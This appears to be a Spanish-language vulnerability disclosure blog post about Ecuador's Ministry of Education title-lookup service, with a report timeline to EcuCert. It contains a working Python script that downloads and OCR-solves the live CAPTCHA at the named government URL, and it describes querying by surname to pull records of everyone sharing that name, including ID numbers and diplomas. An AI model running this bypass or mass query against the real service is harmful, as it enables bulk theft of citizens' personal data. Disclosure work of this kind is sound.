---
pubDatetime: 2025-06-16
title: Tus datos han sido filtrados | educacion.gob.ec
description: Ninguna inyección SQL fue necesaria, solo un apellido y el checkbox indicado para explotar el registro de títulos de bachilleres del Ecuador
featured: true
draft: true
author: eserror
tags:
  - filtracion
  - ecuador
---

Durante los últimos años el gobierno del Ecuador ha realizado esfuerzos por modernizar y digitalizar su infraestructura. Gracias a estas iniciativas, hoy en es posible realizar el apostillado, obtener una copia del título de bachiller u otros servicios que pueden ser encontrados en [www.gob.ec](https://www.gob.ec/).

Entre los nuevos servicios ofrecidos por el gobierno, la facilidad para obtener una copia del título de bachiller me llevó a pensar en las posibilidades, dada la cantidad cantidad y el tipo de información que posiblemente almacenaba, una falla de seguridad sería catastrófica.

Es así como descubrí una vulnerabilidad que afecta a la mayoría de los ecuatorianos, exponiendo cédulas, nombres completos, copia completa del título de bachiller, etc.

Es necesario un ataque sofisticado cuando un apellido y el checkbox indicado te pueden entregar toda la base de datos?

## Vulnerabilidades

1. Weak CAPTCHA

La plataforma del servicio de consulta de títulos de bachilleres, cuenta con un mecanismo para evitar repetidas solicitudes y abusos de bots, sin embargo, este mecanismo es muy debil por lo tanto fácil de vulnerar.

El siguiente código en python pretende ser una prueba de concepto para demostrar qué tan fácil es abusar del mecanismo de seguridad actual:

```python
import requests
from PIL import Image
import io
import re
import os
import easyocr
import numpy as np

try:
    reader = easyocr.Reader(['en'], gpu=True)
    EASYOCR_AVAILABLE = True
except Exception as e:
    print(f"ERROR: Failed to initialize EasyOCR: {e}")
    print("Please ensure 'easyocr' and 'torch', 'torchvision', 'torchaudio' are installed.")
    EASYOCR_AVAILABLE = False

def solve_captcha_ai(image_url, save_ocr_input_filename="image.png"):

    if not EASYOCR_AVAILABLE:
        print("EasyOCR is not available. Cannot proceed.")
        return None

    try:

        response = requests.get(image_url, stream=True, timeout=15)
        response.raise_for_status()
        image_bytes = response.content

        image_data_for_ocr = image_bytes

        try:
            if not save_ocr_input_filename:
                raise ValueError("Save filename is empty or None.")

            img_to_save = Image.open(io.BytesIO(image_data_for_ocr))
            img_to_save.save(save_ocr_input_filename)

        except ValueError as ve:
             print(f"Error preparing to save: {ve}")
        except Exception as e:

            print(f"Warning: Could not save the image being read ('{save_ocr_input_filename}'): {e}")
            print(f"Exception Type: {type(e)}")

        print("Processing image...")
        results = reader.readtext(image_data_for_ocr, detail=1, paragraph=False)

        if results:
            extracted_text = "".join([detection[1] for detection in results])
            cleaned_text = re.sub(r'[^a-zA-Z0-9]', '', extracted_text).strip()

            return cleaned_text
        else:
            print("EasyOCR did not detect any text in the image.")
            return ""

    except requests.exceptions.RequestException as e:
        print(f"Network error downloading image: {e}")
        return None
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        import traceback
        traceback.print_exc()
        return None

captcha_url = "https://servicios.educacion.gob.ec/titulacion25-web/Captcha.jpg"
filename_for_ocr_input = "image.png"

extracted_text = solve_captcha_ai(captcha_url, save_ocr_input_filename=filename_for_ocr_input)
print(f"Result: {extracted_text}")

```

En la pantalla de fondo, se encuentra la imágen `image.png`, esta se genera automáticamente con caracteres aleatorios como medida para evitar solicitudes excesivas. En la imágen, se puede ver el resultado de la ejecución del script que intenta leer el texto de la imágen, dando como resultado la lectura del texto de la imágen.

Lo importe de haber encontrado una falla en este componente, es que me permite realizar solicitudes al servicio, sin ningún tipo de restricción, lo cual es útil para extraer los registros de la base de datos de forma menos dolorosa.

![](@assets/images/Pasted image 20250417200405.png)

2. Sensitive Data Exposure

Existen dos formas de consultar información sobre un usuario específico, usando un ID como cédula o apellidos.

Usando la opción de los apellidos, es la que más retorno de inversión proporciona ya que solo es necesario un apellido random, y la aplicación te entrega la información de todos las personas que tengan ese apellido, es decir que si uso como apellido zambrano, mostrará la información de todos los ecuatorianos con ese apellido.

![](@assets/images/Pasted image 20250417110345.png)

![](@assets/images/Pasted image 20250417110500.png)

### Conclusión

Cada día es más común enterarse en las noticias sobre nuevas filtraciones de datos personales, las cuales pasan desapercibidas como una notificación molesta en el teléfono. Se habla de un crecimiento e iniciativas como la Estrategia Nacional de Ciberseguridad o la Ley Orgánica de Protección de Datos Personales, sin embargo en la práctica nos encontramos en un estado de inactividad cuando de la realidad se trata.

Report Timeline

17-04-2025: Reporte Inicial a EcuCert</br>
22-05-2025: EcuCert responde alegando que no hay un programa responsable de divulgación de vulnerabilidades</br>
16-06-2025: Sin respuesta
